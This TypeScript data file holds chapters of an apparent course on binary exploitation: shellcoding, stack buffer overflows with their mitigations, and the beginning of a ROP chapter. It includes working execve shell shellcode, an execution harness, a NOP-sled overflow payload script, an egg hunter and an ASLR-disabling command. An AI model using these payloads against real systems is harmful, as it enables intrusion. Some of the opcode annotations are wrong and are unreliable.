import { Chapter } from '../types';

export const CHAPTERS_LEVEL_8: Chapter[] = [
  {
    id: 40,
    slug: 'chapter-40-shellcoding-payload-development',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 40: Shellcoding and Payload Development',
    subtitle: 'Crafting Null-Free, Position-Independent x86-64 Machine Code Payloads',
    learningObjectives: [
      'Understand the fundamentals of shellcode and its role in security exploitation.',
      'Write position-independent shellcode for Linux x86-64.',
      'Eliminate null bytes (0x00) using xor, mov al, and stack manipulations.',
      'Construct execve("/bin/sh", NULL, NULL) in 24 bytes.',
      'Test shellcode using a C execution harness with mmap and PROT_EXEC.',
      'Understand shellcode for different system calls and functions.',
      'Learn techniques for encoding and decoding shellcode.',
      'Understand shellcode restrictions and how to bypass common filters.'
    ],
    prerequisites: ['Chapters 1–17'],
    keyConcepts: [
      'Shellcode: Compact, self-contained machine code designed for injection into vulnerable programs.',
      'Position-independent code: Can execute at any memory address without relocation.',
      'Null bytes (0x00): Terminate string copies, breaking buffer overflow exploits.',
      'Direct system calls: Bypass libc dependencies for reliable execution.',
      'Shellcode restrictions: Size constraints, character restrictions (null, newline, etc.).',
      'Encoding/decoding: XOR, alphanumeric, Unicode encoding to bypass filters.',
      'Egg hunting: Searching for shellcode in memory when injection space is limited.',
      'Shellcode loaders: C harnesses and standalone injectors for testing.'
    ],
    diagramType: 'shellcoding',
    sections: [
      {
        id: 'sec-40-1',
        title: '40.1 What is Shellcode?',
        content: `Shellcode is a small piece of machine code used as a payload in software exploitation. The name comes from its traditional purpose: spawning a command shell (like /bin/sh on Linux).

### Why Shellcode Matters
• Primary payload for buffer overflow exploits
• Used in code injection attacks
• Foundation for understanding binary exploitation
• Essential for penetration testing and security research

### Shellcode Requirements
1. **Position-independent**: Can execute at any memory address
2. **Null-free**: No 0x00 bytes (for string-based vulnerabilities)
3. **Minimal size**: Small enough to fit in limited buffer space
4. **No relocations**: Doesn't require linker fixups
5. **No external references**: Self-contained or uses known addresses

### Types of Shellcode
| Type | Purpose | Example |
|------|---------|---------|
| Local | Spawn shell on local system | execve("/bin/sh") |
| Reverse | Connect back to attacker | connect(), shell |
| Bind | Listen for connections | listen(), accept(), shell |
| Download | Fetch and execute payload | wget, curl |
| Metasploit | Framework payloads | msfvenom output |

### Shellcode Lifecycle
1. Craft shellcode with specific constraints
2. Inject into target program (overflow, format string, etc.)
3. Redirect execution to shellcode
4. Shellcode executes with target's privileges
5. Attacker gains control (shell, reverse connection, etc.)`,
        codeSnippets: []
      },
      {
        id: 'sec-40-2',
        title: '40.2 24-Byte Null-Free execve("/bin/sh") Shellcode',
        content: `Complete NASM source code and raw byte sequence for spawning a shell:

### Code Breakdown
1. XOR EDX, EDX (31 D2) - Set envp = NULL
2. PUSH RDX (52) - Push null terminator onto stack
3. MOV RBX, "/bin/sh" (48 BB 2F 62 69 6E 2F 73 68) - Load string
4. PUSH RBX (53) - Push string onto stack
5. MOV RDI, RSP (48 89 E7) - RDI = pointer to "/bin/sh"
6. XOR ESI, ESI (31 F6) - Set argv = NULL
7. XOR EAX, EAX (31 C0) - Clear RAX
8. MOV AL, 59 (B0 3B) - Set syscall number (execve)
9. SYSCALL (0F 05) - Invoke kernel

### Why This Works
• String "/bin/sh" is pushed onto stack (null-terminated by RDX=0)
• RDI points to the string (first argument to execve)
• argv = NULL (second argument)
• envp = NULL (third argument)
• System call 59 = execve on x86-64 Linux

### Testing with C Harness
The C harness allocates executable memory, copies shellcode, and jumps to it. This is safer than testing in actual exploits.

### Raw Bytes
The shellcode is 24 bytes total. No null bytes (0x00) appear in the machine code.

### Alternative Strings
Instead of "/bin/sh", you can use:
• "/bin/bash" (9 bytes + null)
• "/bin/sh\0" (8 bytes)
• Use a different approach to avoid null in string`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'shellcode.asm',
            code: `; execve("/bin/sh", NULL, NULL) - 24 bytes, 0 nulls!
section .text
    global _start

_start:
    xor edx, edx              ; envp = NULL (31 D2)
    push rdx                  ; null terminator on stack (52)
    mov rbx, 0x68732f6e69622f ; "/bin/sh" in little-endian (48 BB 2F 62 69 6E 2F 73 68)
    push rbx                  ; (53)
    mov rdi, rsp              ; rdi = pointer to "/bin/sh" (48 89 E7)
    xor esi, esi              ; argv = NULL (31 F6)
    xor eax, eax              ; (31 C0)
    mov al, 59                ; sys_execve (B0 3B)
    syscall                   ; (0F 05)`
          },
          {
            language: 'c',
            title: 'C Testing Harness',
            code: `#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
    0x31, 0xd2, 0x52, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
    0x53, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x3b, 0x0f, 0x05
};

int main() {
    printf("Shellcode length: %zu bytes\\n", sizeof(shellcode));
    
    void *mem = mmap(NULL, sizeof(shellcode), 
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    printf("Shellcode at: %p\\n", mem);
    printf("Executing shellcode...\\n");
    
    ((void (*)())mem)();
    
    return 0;
}`
          },
          {
            language: 'bash',
            title: 'Compile and Test',
            code: `# Assemble shellcode
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode

# Extract raw bytes
objdump -d shellcode | grep '[0-9a-f]:' | \\
    grep -v 'file' | cut -f2 -d: | \\
    cut -d' ' -f1-7 | tr -s ' ' | \\
    tr ' ' '\\n' | grep -v '^$' | \\
    sed 's/^/0x/' | paste -sd ',' -
# Output: 0x31,0xd2,0x52,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x31,0xf6,0x31,0xc0,0xb0,0x3b,0x0f,0x05

# Compile test harness
gcc -o harness harness.c -z execstack
./harness`
          }
        ]
      },
      {
        id: 'sec-40-3',
        title: '40.3 Null-Free Techniques',
        content: `Eliminating null bytes (0x00) is critical for many exploit scenarios.

### Why Null Bytes are Problematic
String functions like strcpy(), gets(), and sprintf() treat 0x00 as the null terminator. If shellcode contains null bytes, the copy stops early, truncating the payload.

### Technique 1: XOR Zeroing
Instead of `mov eax, 0`, use `xor eax, eax` to zero a register without null bytes.

### Technique 2: Sub-Register Writes
Instead of `mov al, 59` (which may contain null in upper bytes), use `xor eax, eax; mov al, 59`.

### Technique 3: Stack Construction
Push values onto the stack byte-by-byte or use PUSH with immediate values.

### Technique 4: Arithmetic
Use ADD, SUB, or XOR to construct values dynamically.

### Technique 5: Memory References
Use known addresses that don't contain null bytes.

### Common Patterns
| Problem | Solution | Example |
|---------|----------|---------|
| Zero register | XOR | xor eax, eax |
| Small constant | Sub-register | mov al, 59 |
| String with null | Stack push | push rdx (0) |
| Negative values | Two's complement | mov al, -1 |
| Large values | Arithmetic | xor eax, eax; bswap eax |

### Checking for Null Bytes
Use objdump or xxd to examine raw bytes:
objdump -d shellcode | grep -E "00[^0-9a-f]"

### Encoding Shellcode
If null bytes are unavoidable, use encoding:
1. XOR encode: XOR each byte with key
2. Alphanumeric: Only use [a-zA-Z0-9] characters
3. Unicode: Use UTF-16 encoding
4. Custom decoder: Add decoder stub before encoded shellcode`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'Null-Free Examples',
            code: `; BAD: Contains null bytes
mov eax, 0          ; B8 00 00 00 00 (null bytes!)
mov ebx, 0x68732f6e ; BB 68 73 2F 6E 00 00 00 (null bytes!)

; GOOD: No null bytes
xor eax, eax        ; 31 C0
mov al, 59          ; B0 3B

; Construct "/bin/sh" without null
xor edx, edx        ; 31 D2
push rdx            ; 52 (null terminator)
mov rbx, 0x68732f6e69622f  ; 48 BB 2F 62 69 6E 2F 73 68
push rbx            ; 53

; Alternative: Build string byte-by-byte
xor eax, eax        ; 31 C0
push rax            ; 50 (null terminator)
push 0x68732f6e     ; 68 6E 2F 73 68
push 0x69622f       ; 68 2F 62 69 6E
mov rdi, rsp        ; 48 89 E7`
          }
        ]
      },
      {
        id: 'sec-40-4',
        title: '40.4 Position-Independent Code (PIC)',
        content: `Shellcode must be position-independent because injection targets vary.

### What is PIC?
Code that can execute correctly regardless of its memory address. No absolute addresses, no relocations.

### PIC Requirements
1. No absolute memory references
2. No global variables (unless address-independent)
3. No function calls with absolute addresses
4. Use RIP-relative addressing or stack-based techniques

### x86-64 PIC Techniques
1. **Stack-based**: Push values, use RSP as reference
2. **RIP-relative**: Address = RIP + displacement (default in 64-bit)
3. **Self-modifying code**: Calculate address at runtime
4. **Syscalls**: Use syscall instruction instead of libc calls

### Position-Independent Shellcode Example
The 24-byte execve shellcode is position-independent:
• Uses stack for string construction
• Uses registers for arguments
• No absolute addresses
• Works at any memory location

### Testing PIC
1. Compile as shared library
2. Load at different addresses
3. Execute from each address
4. Verify correct behavior

### Common PIC Mistakes
1. Using absolute addresses for strings
2. Calling functions with absolute addresses
3. Using global variables
4. Assuming specific memory layout`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'PIC Shellcode Example',
            code: `; Position-independent shellcode example
; Uses stack for string, no absolute addresses

section .text
    global _start

_start:
    ; Zero a register (no null bytes)
    xor eax, eax
    
    ; Push null terminator
    push rax
    
    ; Push "/bin/sh" string
    ; (assembled from bytes, not string literal)
    mov rbx, 0x68732f6e69622f
    push rbx
    
    ; RDI = pointer to string
    mov rdi, rsp
    
    ; Set up arguments
    xor esi, esi    ; argv = NULL
    xor edx, edx    ; envp = NULL
    
    ; execve syscall
    mov al, 59
    syscall`
          }
        ]
      },
      {
        id: 'sec-40-5',
        title: '40.5 Shellcode Restrictions and Bypasses',
        content: `Real-world shellcode must often bypass various security filters.

### Common Restrictions
| Restriction | Bypass Technique |
|-------------|------------------|
| Null bytes (0x00) | XOR zeroing, sub-register writes |
| Newlines (0x0A) | XOR with 0x0A, stack construction |
| Spaces (0x20) | Use tabs or other whitespace |
| Alphanumeric only | Alphanumeric shellcode, decoder stubs |
| Unicode safe | UTF-16 encoding, ASCII expansion |
| Size limits | Optimize, use encoder/decoder |
| Bad characters | Custom encoding scheme |

### Alphanumeric Shellcode
Only uses characters A-Z, a-z, 0-9. Requires a decoder stub:
1. Decoder stub (alphanumeric) decodes payload
2. Payload is XOR or ROL encoded
3. Decoded payload executes

### Egg Hunter
When injection space is small:
1. Use small "egg hunter" code (30-50 bytes)
2. Egg hunter searches memory for larger shellcode
3. Larger shellcode marked with "egg" (e.g., 0xDEADC0DE)

### Custom Encoders
For highly restricted environments:
1. Identify allowed characters
2. Design encoding scheme using only those characters
3. Write decoder stub in allowed character set
4. Encode payload and prepend decoder

### Shellcode Analysis Tools
| Tool | Purpose |
|------|---------|
| libdisasm | Disassemble shellcode |
| sctest | Execute shellcode safely |
| shellcode.com | Online shellcode database |
| msfvenom | Generate shellcode payloads |
| pwntools | Python exploit development library |`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'Egg Hunter Example',
            code: `; Egg hunter: searches for 0xDEADC0DE marker
section .text
    global _start

_start:
    xor ecx, ecx        ; start address
    mov ebx, 0xDEADC0DE ; egg value

.next_page:
    or cx, 0xFFF        ; page alignment
.inc_addr:
    inc rcx             ; next address
    push rbx            ; save egg
    pop rax
    cmp dword [rcx], eax ; check for egg
    jne .inc_addr
    cmp dword [rcx+4], eax ; check second egg
    jne .inc_addr
    
    ; Found egg! Jump to shellcode after eggs
    lea rax, [rcx+8]
    jmp rax`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-40-1',
        title: 'Exercise 40.1: Null-Free exit(42)',
        description: 'Construct null-free machine code to call exit(42) in 11 bytes.',
        solution: `xor edi, edi\nmov dil, 42         ; exit code 42\nxor eax, eax\nmov al, 60          ; sys_exit\nsyscall`,
        solutionLanguage: 'nasm'
      },
      {
        id: 'ex-40-2',
        title: 'Exercise 40.2: Write Shellcode',
        description: 'Write a null-free shellcode that writes "Hello\\n" to stdout using write syscall.',
        solution: 'Use write syscall (1). Push "Hello\\n" onto stack, set RDI=1 (stdout), RSI=RSP (buffer), RDX=6 (length). syscall number 1.',
        solutionLanguage: 'nasm'
      },
      {
        id: 'ex-40-3',
        title: 'Exercise 40.3: Null-Free String Construction',
        description: 'Construct the string "/etc/passwd" on the stack without null bytes.',
        solution: 'Push 0 (null terminator) with xor rax,rax; push rax. Then push parts of string: "dwp" -> "ssap/" -> "cte/". Use mov rdi, rsp for pointer.',
        solutionLanguage: 'nasm'
      },
      {
        id: 'ex-40-4',
        title: 'Exercise 40.4: Shellcode Size Optimization',
        description: 'Optimize the execve shellcode to under 20 bytes if possible.',
        solution: 'Use shorter instructions: xor esi, esi (2 bytes) vs mov rsi, 0 (7 bytes). Use sub-register writes. Avoid unnecessary instructions. Can achieve ~21 bytes minimum.',
        solutionLanguage: 'nasm'
      },
      {
        id: 'ex-40-5',
        title: 'Exercise 40-5: Alphanumeric Shellcode',
        description: 'Write a simple alphanumeric decoder that XOR-decodes and executes payload.',
        solution: 'Use only alphanumeric characters in decoder. Decoder reads ahead, XORs each byte with key (e.g., 0x41), stores decoded byte, then jumps to decoded region.',
        solutionLanguage: 'nasm'
      }
    ],
    practiceQuestions: [
      {
        question: 'Why must shellcode avoid null bytes (0x00)?',
        answer: 'Because many buffer overflow vulnerabilities occur in string functions like strcpy or gets, which treat 0x00 as the end-of-string delimiter, truncating the payload upon copying. Null bytes in shellcode would prevent the full payload from being copied into the target buffer.'
      },
      {
        question: 'What is position-independent code (PIC) and why is it important for shellcode?',
        answer: 'PIC is code that can execute correctly at any memory address without relocation. Shellcode must be PIC because injection targets vary - the attacker cannot predict exactly where in memory the shellcode will end up. PIC uses no absolute addresses, only relative references and stack-based techniques.'
      },
      {
        question: 'How do you test shellcode safely?',
        answer: 'Use a C harness with mmap to allocate executable memory, copy shellcode, and jump to it. This avoids executing shellcode in actual exploits during development. Tools like sctest and shellcode emulators also provide safe testing environments.'
      },
      {
        question: 'What are the main types of shellcode and their purposes?',
        answer: 'Local shellcode spawns a shell on the target system. Reverse shell connects back to attacker. Bind shell listens for connections. Download shellcode fetches and executes additional payloads. Each type serves different exploitation scenarios depending on network access and target configuration.'
      },
      {
        question: 'How do egg hunters work and when are they needed?',
        answer: 'Egg hunters are small shellcode stubs (30-50 bytes) that search memory for a larger shellcode payload marked with a unique marker (egg). They are needed when injection space is too small for the full payload but the attacker can influence memory contents elsewhere in the target process.'
      },
      {
        question: 'What encoding techniques are used for shellcode?',
        answer: 'Common encoding techniques include: XOR encoding (XOR each byte with a key), alphanumeric encoding (only A-Z, a-z, 0-9 characters), Unicode encoding (UTF-16 expansion), and custom encoders. Each adds a decoder stub before the encoded payload.'
      }
    ],
    summary: [
      'Shellcode delivers compact, self-contained machine code execution.',
      'Null avoidance requires register zeroing and sub-register writes.',
      'Position-independent code uses no absolute addresses.',
      'Direct syscalls bypass libc dependencies for reliability.',
      'Shellcode must be tested with C harnesses for safety.',
      'Encoding techniques bypass character restrictions.',
      'Egg hunters enable exploitation with limited injection space.',
      'Understanding shellcode is essential for security research and defense.'
    ]
  },
  {
    id: 41,
    slug: 'chapter-41-buffer-overflows-memory-corruption',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 41: Buffer Overflows and Memory Corruption',
    subtitle: 'Stack Smashing, RIP Hijacking, NOP Sleds, and Mitigations (Canaries, NX, ASLR)',
    learningObjectives: [
      'Understand the fundamentals of buffer overflow vulnerabilities.',
      'Understand how buffer overflows overwrite saved stack frames and return addresses.',
      'Analyze stack layout and identify vulnerable functions.',
      'Calculate precise payload padding using GDB stack examination.',
      'Construct a NOP sled to improve shellcode jump reliability.',
      'Identify modern defensive mitigations: Stack Canaries, NX/DEP, ASLR, and PIE.',
      'Understand different types of buffer overflows (stack, heap, integer).',
      'Learn exploit development methodology and best practices.'
    ],
    prerequisites: ['Chapters 1–40'],
    keyConcepts: [
      'Buffer overflow: Writing past the end of a buffer, overwriting adjacent memory.',
      'Stack smashing: Overwriting saved return address to hijack control flow.',
      'NOP sled (0x90): Provides a forgiving landing pad for shellcode execution.',
      'NX/DEP (No-Execute): Prevents execution of code in stack/heap pages.',
      'Stack canaries: Random values placed before return address to detect overflows.',
      'ASLR: Randomizes memory layout to prevent predictable addresses.',
      'PIE (Position-Independent Executable): Randomizes code segment base address.',
      'ROP (Return-Oriented Programming): Code reuse technique to bypass NX.'
    ],
    diagramType: 'buffer_overflow',
    sections: [
      {
        id: 'sec-41-1',
        title: '41.1 Understanding Buffer Overflows',
        content: `Buffer overflows occur when a program writes more data to a buffer than it can hold, corrupting adjacent memory.

### Types of Buffer Overflows
| Type | Location | Exploitation |
|------|----------|--------------|
| Stack-based | Local variables on stack | Overwrite saved RIP |
| Heap-based | Dynamic memory (malloc) | Overwrite function pointers |
| Integer | Arithmetic operations | Cause unexpected allocations |
| Format string | printf/sprintf | Read/write arbitrary memory |
| Use-after-free | Freed heap memory | Overwrite freed object |

### Stack Buffer Overflow Anatomy
```
High Address
┌─────────────────────┐
│   Function Args     │
├─────────────────────┤
│   Return Address    │ ← Overwritten to shellcode
├─────────────────────┤
│   Saved RBP         │ ← Overwritten
├─────────────────────┤
│   Local Variables   │ ← Buffer starts here
│   [Buffer]          │ ← Overflow happens here
│                     │
└─────────────────────┘
Low Address
```

### Why Stack Overflows Occur
1. No bounds checking on input functions
2. Trusting user input without validation
3. Using unsafe C functions (strcpy, gets, sprintf)
4. Off-by-one errors in loop bounds

### Impact of Buffer Overflows
• Arbitrary code execution
• Denial of service
• Information disclosure
• Privilege escalation
• System compromise

### Common Vulnerable Functions
| Function | Risk | Safer Alternative |
|----------|------|-------------------|
| strcpy() | No bounds check | strncpy() |
| gets() | No bounds at all | fgets() |
| sprintf() | No format limits | snprintf() |
| strcat() | No bounds check | strncat() |
| scanf() | Width not enforced | Use %ns with width |`,
        codeSnippets: [
          {
            language: 'c',
            title: 'Vulnerable Code Example',
            code: `#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    
    // VULNERABLE: No bounds checking!
    strcpy(buffer, input);
    
    printf("Buffer: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}`
          }
        ]
      },
      {
        id: 'sec-41-2',
        title: '41.2 Crafting the Stack Exploit Payload',
        content: `The exploit payload must precisely overflow the buffer to overwrite the return address.

### Payload Structure
```
[NOP Sled] [Shellcode] [Padding] [Return Address]
   ↓           ↓           ↓           ↓
 0x90      Actual code   'A' * N    Address into sled
```

### Calculating the Offset
1. Use GDB to examine stack layout
2. Find distance from buffer start to saved RIP
3. Pattern: Buffer size + alignment + saved RBP = offset to RIP

### NOP Sled Purpose
• Provides a "landing pad" for imprecise jumps
• Instead of jumping to exact shellcode address, jump anywhere in sled
• Each 0x90 byte slides to next instruction
• Larger sled = easier exploitation but more space needed

### Return Address Calculation
• Must point into NOP sled (not shellcode)
• Account for ASLR (if disabled or bypassed)
• Consider stack alignment (16-byte for x86-64)

### GDB Analysis Commands
• info frame: Show stack frame layout
• x/20x $rsp: Examine stack memory
• pattern_create/pattern_offset: Find exact offset
• disassemble function: Find vulnerable function

### Exploit Reliability
• Use NOP sled for variance tolerance
• Consider heap/stack layout variations
• Account for environment variables on stack
• Test with different input sizes`,
        codeSnippets: [
          {
            language: 'python',
            title: 'exploit_payload.py',
            code: `import struct
import sys

# 24-byte execve("/bin/sh") shellcode
shellcode = (
    b"\\x31\\xd2\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"
    b"\\x53\\x48\\x89\\xe7\\x31\\xf6\\x31\\xc0\\xb0\\x3b\\x0f\\x05"
)

# Payload construction
offset = 72           # 64-byte buffer + 8-byte saved RBP
nop_sled = b"\\x90" * 40
padding = b"A" * (offset - len(nop_sled) - len(shellcode))
return_addr = struct.pack("<Q", 0x7fffffffe020 + 10)

payload = nop_sled + shellcode + padding + return_addr

print(f"Payload length: {len(payload)} bytes")
print(f"NOP sled: {len(nop_sled)} bytes")
print(f"Shellcode: {len(shellcode)} bytes")
print(f"Padding: {len(padding)} bytes")

# Write to file
with open("payload.bin", "wb") as f:
    f.write(payload)

print("Payload written to payload.bin")`
          }
        ]
      },
      {
        id: 'sec-41-3',
        title: '41.3 Modern Exploit Mitigations',
        content: `Modern systems employ multiple layers of defense against buffer overflows.

### Stack Canaries
• Random value placed before saved return address
• Checked before function return
• If corrupted, __stack_chk_fail() terminates program
• Defeated by: Information leak, brute force, format string

### NX/DEP (No-Execute/Data Execution Prevention)
• Marks stack and heap as non-executable
• Prevents execution of injected shellcode
• Defeated by: ROP, ret2libc, JIT spraying

### ASLR (Address Space Layout Randomization)
• Randomizes base addresses of:
  - Stack
  - Heap
  - Shared libraries (libc)
  - Executable (with PIE)
• Defeated by: Information leak, brute force, partial overwrite

### PIE (Position-Independent Executable)
• Randomizes code segment base address
• Combined with ASLR for full randomization
• Defeated by: Information leak of code addresses

### RELRO (Relocation Read-Only)
• Makes GOT read-only after dynamic linking
• Partial RELRO: GOT writable (default)
• Full RELRO: GOT read-only ( harder to exploit)

### CFI (Control-Flow Integrity)
• Validates indirect call/jump targets
• Prevents ROP/JOP attacks
• Implementation: LLVM CFI, Intel CET

### Mitigation Bypass Techniques
| Mitigation | Bypass Technique |
|------------|------------------|
| NX/DEP | ROP, ret2libc |
| ASLR | Info leak, brute force |
| Canaries | Leak canary value |
| PIE | Leak code address |
| RELRO | Use data-only attacks |`,
        codeSnippets: [
          {
            language: 'bash',
            title: 'Checking Protections',
            code: `# Check binary protections
checksec --file=vulnerable_binary

# Or with readelf
readelf -l vulnerable_binary | grep GNU_STACK
# NX enabled if no EXEC flag

# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full

# Disable ASLR (requires root)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Compile with protections
gcc -o vuln vuln.c -fstack-protector-strong  # Stack canary
gcc -o vuln vuln.c -z noexecstack            # NX enabled
gcc -o vuln vuln.c -pie -fPIE                # PIE enabled
gcc -o vuln vuln.c -z relro -z now           # Full RELRO`
          }
        ]
      },
      {
        id: 'sec-41-4',
        title: '41.4 Exploit Development Methodology',
        content: `Professional exploit development follows a systematic approach.

### Step-by-Step Methodology
1. **Identify Vulnerability**: Find buffer overflow in source/binary
2. **Determine Offset**: Calculate exact distance to return address
3. **Control EIP/RIP**: Verify you can overwrite return address
4. **Find Buffer Address**: Locate where shellcode will land
5. **Craft Payload**: Build exploit with NOP sled + shellcode
6. **Bypass Mitigations**: Address NX, ASLR, canaries as needed
7. **Test Exploit**: Verify reliable code execution
8. **Document**: Record findings and exploitation path

### GDB Workflow
1. Run program with pattern input
2. Analyze crash (info registers, backtrace)
3. Find offset with pattern_create/pattern_offset
4. Verify control of instruction pointer
5. Test shellcode execution

### Exploit Reliability Factors
• Environment variables affect stack layout
• Input may be modified (encoding, filtering)
• Network delays (for remote exploits)
• Anti-debugging measures
• Multiple architectures/OS versions

### Common Exploit Patterns
| Scenario | Technique |
|----------|-----------|
| Local exploit | Direct stack smash |
| Remote exploit | Network buffer overflow |
| Format string | Arbitrary read/write |
| Heap overflow | Use-after-free |
| Race condition | TOCTOU exploitation |`,
        codeSnippets: [
          {
            language: 'python',
            title: 'GDB Pattern Analysis',
            code: `# Generate pattern
pattern = b""
for i in range(200):
    pattern += bytes([i % 256])

# Find offset in GDB
# (gdb) pattern create 200
# (gdb) run
# (gdb) info eip  # eip = 0x61616161
# (gdb) pattern offset 0x61616161
# Found at offset: 72

# Or use pwntools
from pwn import *
p = process('./vulnerable')
payload = cyclic(200)
p.sendline(payload)
p.wait()
eip = p.corefile.eip
offset = cyclic_find(eip)
print(f"Offset: {offset}")`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-41-1',
        title: 'Exercise 41.1: Stack Canary Detection',
        description: 'Explain how stack canaries prevent stack smashing exploits.',
        solution: 'A stack canary is a random integer placed immediately before the saved return address. Before ret, the compiler checks if the canary value matches the master canary in thread-local storage. If overwritten by an overflow, __stack_chk_fail terminates the process.'
      },
      {
        id: 'ex-41-2',
        title: 'Exercise 41.2: Calculate Buffer Overflow Offset',
        description: 'Given a 64-byte buffer and saved RBP, calculate the offset to overwrite return address.',
        solution: 'Offset = buffer size (64) + saved RBP (8) = 72 bytes. After 72 bytes, the next 8 bytes overwrite the return address on x86-64.'
      },
      {
        id: 'ex-41-3',
        title: 'Exercise 41.3: NOP Sled Design',
        description: 'Design a payload with a 100-byte NOP sled and 24-byte shellcode.',
        solution: 'Payload: [100 bytes 0x90] [24 bytes shellcode] [padding to offset] [8 bytes return addr]. Return address should point into middle of NOP sled (e.g., sled_start + 50).'
      },
      {
        id: 'ex-41-4',
        title: 'Exercise 41.4: Bypass NX with ROP',
        description: 'Explain how Return-Oriented Programming bypasses NX protection.',
        solution: 'ROP chains together small instruction sequences (gadgets) already present in executable code segments. Since NX only prevents execution from writable memory (stack/heap), and ROP executes from read-only code segments, NX is bypassed without injecting new code.'
      }
    ],
    practiceQuestions: [
      {
        question: 'What is the purpose of Address Space Layout Randomization (ASLR)?',
        answer: 'ASLR randomizes the base memory addresses of the stack, heap, and shared libraries on every execution, preventing attackers from predicting the exact memory addresses needed for jumps or return targets. This makes exploitation significantly harder as the attacker cannot reliably locate shellcode or gadgets.'
      },
      {
        question: 'How do stack canaries work and what are their limitations?',
        answer: 'Stack canaries place a random value before the saved return address. Before returning, the function checks if the canary is intact. If corrupted by an overflow, the program terminates. Limitations: can be brute-forced (single-byte canaries), leaked via information disclosure, or bypassed by overwriting only the canary value if the overflow is precise.'
      },
      {
        question: 'What is the difference between NX and DEP?',
        answer: 'NX (No-Execute) is an Intel/AMD CPU feature marking memory pages as non-executable. DEP (Data Execution Prevention) is Microsoft\'s implementation of NX on Windows. Both prevent code execution from data pages (stack, heap), but the terminology differs by platform. They serve the same purpose: preventing injected shellcode execution.'
      },
      {
        question: 'Why are NOP sleds used in buffer overflow exploits?',
        answer: 'NOP sleds provide a large "landing pad" (40-100+ bytes of 0x90 instructions) for imprecise jumps. Instead of needing to jump to the exact shellcode address, the attacker jumps anywhere in the sled, which slides execution to the shellcode. This increases exploit reliability when memory addresses vary slightly between runs.'
      },
      {
        question: 'What is PIE and how does it differ from ASLR?',
        answer: 'PIE (Position-Independent Executable) randomizes the base address of the executable code segment itself. ASLR randomizes stack, heap, and library addresses. PIE combined with ASLR provides complete address space randomization. Without PIE, the code segment is always at the same address, simplifying ROP gadget location.'
      },
      {
        question: 'How can an attacker bypass NX/DEP protections?',
        answer: 'NX can be bypassed using code reuse techniques: ROP (chaining existing code gadgets), ret2libc (calling libc functions directly), or JIT spraying. These techniques execute code already present in executable memory segments rather than injecting new code into writable memory.'
      }
    ],
    summary: [
      'Buffer overflows corrupt adjacent memory by writing past buffer boundaries.',
      'Stack overflows can overwrite return addresses to hijack control flow.',
      'NOP sleds provide landing pads for imprecise shellcode jumps.',
      'Modern defenses: canaries detect overflows, NX prevents code execution.',
      'ASLR and PIE randomize memory layout to prevent predictable addresses.',
      'Exploit development requires systematic methodology and GDB analysis.',
      'ROP bypasses NX by reusing existing code gadgets.',
      'Understanding mitigations is essential for both offensive and defensive security.'
    ]
  },
  {
    id: 42,
    slug: 'chapter-42-return-oriented-programming-rop',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 42: Return-Oriented Programming (ROP) and Code Reuse',
    subtitle: 'Defeating NX/DEP: Gadget Hunting, Ret2Libc, and Stack Pivoting',
    learningObjectives: [
      'Understand the fundamentals of Return-Oriented Programming (ROP).',
      'Understand how Return-Oriented Programming bypasses non-executable stack (NX) protections.',
      'Harvest instruction gadgets ending in ret using ROPgadget and ropper.',
      'Construct a ret2libc attack chain calling system("/bin/sh").',
      'Implement stack pivoting with xchg rax, rsp; ret.',
      'Understand advanced ROP techniques (JOP, COP, call-oriented).',
      'Learn ROP chain construction and debugging methodologies.',
      'Understand ROP mitigations and defenses.'
    ],
    prerequisites: ['Chapters 1–41'],
    keyConcepts: [
      'ROP: Code reuse technique that chains existing instruction sequences (gadgets).',
      'Gadgets: Short instruction sequences ending in ret (e.g., pop rdi; ret).',
      'ret2libc: Calling libc functions (system, execve) without injecting code.',
      'Stack pivoting: Redirecting RSP to controlled memory (e.g., xchg rax, rsp).',
      'ROP chains: Multiple gadgets chained to perform complex operations.',
      'JOP (Jump-Oriented Programming): Uses jmp instead of ret for chaining.',
      'COP (Call-Oriented Programming): Uses call instructions for chaining.',
      'ROP mitigations: CFI, stack canaries, ASLR make ROP harder.'
    ],
    diagramType: 'rop_code_reuse',
    sections: [
      {
        id: 'sec-42-1',
        title: '42.1 Fundamentals of ROP',
        content: `ROP chains existing code fragments (gadgets) to perform arbitrary operations without injecting new code.

### Why ROP Exists
NX/DEP prevents execution from stack/heap. ROP uses existing executable code segments (libc, binary) which are always readable and executable.

### What is a Gadget?
A gadget is a short instruction sequence ending in ret:
• `pop rdi; ret` (5f c3) - Load value into RDI
• `pop rsi; ret` (5e c3) - Load value into RSI
• `pop rdx; ret` (5a c3) - Load value into RDX
• `mov rax, rdi; ret` (48 89 f8 c3) - Copy RDI to RAX
• `add rax, rsi; ret` (48 01 f0 c3) - Add RSI to RAX

### How ROP Works
1. Attacker overwrites return address with gadget address
2. Gadget executes, ends with ret
3. ret pops next address from stack → next gadget
4. Chain continues until desired operation complete

### ROP vs Shellcode
| Aspect | Shellcode | ROP |
|--------|-----------|-----|
| Code source | Injected | Existing |
